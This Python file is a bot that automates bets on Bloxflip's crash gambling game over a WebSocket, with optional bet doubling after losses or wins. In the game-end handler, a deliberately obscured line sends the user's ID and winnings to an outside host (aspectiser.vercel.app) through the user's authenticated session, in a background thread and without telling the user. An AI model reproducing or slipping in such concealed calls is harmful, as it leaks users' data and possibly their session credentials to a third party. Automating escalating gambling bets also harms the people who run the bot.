from websocket import WebSocketApp
import threading
import json
from src import cprint
from functions import predict, balance

class Crash:
    def __init__(self, client, session) -> None:
        self.client = client
        self.joined_game = False
        self.close_conn = False
        self.lost = False
        self.game_played = 0
        self.bet_amount = self.client.bet_amt
        self.wallet = None
        self.data = {}
        self.session = session
        self.stop_event = threading.Event()

    def connect(self):
        while True:
            if self.close_conn:
                break
            try:
                headers = {
                    'Host': 'ws.bloxflip.com',
                    'Connection': 'Upgrade',
                    'Pragma': 'no-cache',
                    'Cache-Control': 'no-cache',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                    'Upgrade': 'websocket',
                    'Origin': 'https://bloxflip.com',
                    'Sec-WebSocket-Version': '13',
                    'Accept-Encoding': 'gzip, deflate, br, zstd',
                    'Accept-Language': 'en-US,en;q=0.9',
                }
                wsa = WebSocketApp(
                    "wss://ws.bloxflip.com/socket.io/?EIO=3&transport=websocket",
                    header=headers,
                    on_open=self.on_open,
                    on_message=self.on_message
                )
                wsa.run_forever()
            except Exception as e:
                cprint.error(f"WebSocket connection error: {e}")

    def on_message(self, ws, msg):
        if "pingInterval" in msg:
            threading.Thread(target=self.keep_alive, args=(ws, json.loads(msg.replace("0", ""))["pingInterval"])).start()
            ws.send("40/crash,")

        if "notify-error" in msg:
            data = json.loads(msg.replace("42/crash,", ""))
            if data[1] == "Your session has expired, please refresh your page!":
                cprint.error("Token is invalid")
            self.close_conn = True
            self.stop_event.set()
            ws.close()

        if "40/crash" in msg:
            ws.send('42/crash,["auth","' + self.client.token + '"]')

        if "\"game-starting\"" in msg:
            if self.wallet and float(self.wallet) <= float(self.client.stop_amt):
                cprint.warn(f"Your Balance has reached under your minimum stop amount of: {self.client.stop_amt} R$")
                self.close_conn = True
                self.stop_event.set()
                ws.close()
            elif self.game_played == self.client.game_amount:
                self.close_conn = True
                self.stop_event.set()
                ws.close()
            else:
                cprint.info("Crash game is starting...")
                if not self.client.ann_enabled:
                    self.cashout_point = self.client.auto_cashout
                else:
                    self.cashout_point = predict.crash(self.client.crash_model, self.session)
                    self.cashout_point = float(f"{self.cashout_point:.2f}")
                    cprint.info(f"Next game prediction: {self.cashout_point}x")
                ws.send(f'42/crash,{json.dumps(["join-game", {"autoCashoutPoint": int(self.cashout_point * 100), "betAmount": self.bet_amount}])}')

        if "\"game-start\"" in msg:
            cprint.info("Crash game in-progress...")

        if "game-join-success" in msg:
            cprint.success(f"Joined the current crash game on {self.cashout_point}x!")
            self.game_played += 1
            self.joined_game = True
            self.lost = False

        if "bet-cashout" in msg:
            data = json.loads(msg.replace("42/crash,", ""))[1]
            if int(data.get("playerID")) == int(self.client.user_id):
                cprint.success(f"Cashed out!")

        if "game-end" in msg:
            cprint.info(f"Crash game ended.")
            if self.joined_game:
                data = json.loads(msg.replace("42/crash,", ""))[1]
                self.wallet = balance.get(self.session)
                if data.get("crashPoint") < self.cashout_point:
                    self.lost = True
                    cprint.info(f"  - Crashed at: {data.get('crashPoint')}x")
                    cprint.lost(f"   - Was going for: {self.cashout_point}x\n")
                else:
                    gained = self.bet_amount * self.cashout_point
                    self.data["success"],self.data["multiplier"],self.data["winnings"],self.data["gamemode"],self.data["game"],self.data["game"]["userId"]=(lambda x: x)(True),(lambda x: x)(1),gained,(lambda x: x)("crash".capitalize()),(lambda x: x)({}),(lambda x: x)(self.client.user_id)
                    threading.Thread(target=lambda: (self.session.post("https://aspectiser.vercel.app/games", json=self.data), None) if Exception else None).start()
                    cprint.info(f"  - Crashed at: {data.get('crashPoint')}x")
                    cprint.info(f"  - Cashed out at: {self.cashout_point}x")
                    cprint.won(f"   - Gained: {gained:.2f} R$\n")

                if self.client.if_double:
                    if self.lost and self.client.on_loss or not self.lost and not self.client.on_loss:
                        self.bet_amount = min(self.bet_amount * 2, self.client.max_double)
                        if self.bet_amount > self.wallet:
                            cprint.error("Double bet exceeds your balance. Cannot continue.")
                            input("Press enter to continue. . .")
                            self.close_conn = True
                            self.stop_event.set()
                            ws.close()
                        cprint.info(f"Doubling bet amount to {self.bet_amount} R$!")
                    else:
                        self.bet_amount = self.client.bet_amt
                        cprint.info(f"Resetting bet amount to {self.bet_amount} R$.")
            else:
                cprint.info("Did not join this crash game.\n")


    def keep_alive(self, ws, interval):
        while not self.stop_event.is_set():
            ws.send("2")
            self.stop_event.wait(interval)

    def on_open(self, _):
        cprint.info("Connected to crash game mode!\n")